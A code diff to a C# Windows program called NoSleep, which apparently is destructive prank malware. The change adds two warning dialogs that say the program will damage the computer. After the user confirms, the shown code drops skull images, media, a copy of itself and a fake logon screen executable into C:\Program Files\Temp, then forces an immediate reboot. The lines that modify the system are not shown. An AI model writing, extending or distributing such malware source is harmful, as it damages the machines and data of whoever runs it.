@@ -35,7 +35,31 @@ namespace NoSleep
 
         private void NoSleep_Load(object sender, EventArgs e)
         {
-            if(!File.Exists(@"C:\Program Files\Temp\NoSleep.exe"))
+            if (MessageBox.Show("Are you sure you want to run this program? If you run it, your computer get a lot of damages!!!", "NoSleep", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
+            {
+                this.Close();
+                Application.Exit();
+            }
+            else
+            {
+                Last_Warning();
+            }
+        }
+        public void Last_Warning() 
+        {
+            if (MessageBox.Show("THIS IS THE LAST WARNING. THE AUTHOR IS NOT RESPONSIBLE FOR ANY DAMAGES. STILL RUNNING IT?", "NoSleep", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
+            {
+                this.Close();
+                Application.Exit();
+            }
+            else
+            {
+                NoSleep_StartModify();
+            }
+        }
+        public void NoSleep_StartModify()
+        {
+            if (!File.Exists(@"C:\Program Files\Temp\NoSleep.exe"))
             {
                 Directory.CreateDirectory(@"C:\Program Files\Temp");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "a lot of skulls.jpg");
@@ -46,7 +70,7 @@ namespace NoSleep
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "skull_real_ico.ico");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "some_music.wav");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "some_video.mp4");
-                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "NoSleep.exe"); 
+                Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "NoSleep.exe");
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "AxInterop.WMPLib.dll"); //dll import for video
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "Interop.WMPLib.dll"); //dll import for video
                 Extract("NoSleep", @"C:\Program Files\Temp", "Resources", "RSOD.exe"); //we need to create fake logonui
@@ -177,7 +201,7 @@ namespace NoSleep
 
                 //Restart 
                 Thread.Sleep(5000);
-                Process.Start("shutdown", "/r /t 0");
+                Process.Start("shutdown", "/r /t 03");
                 Environment.Exit(-1);
             }
             else
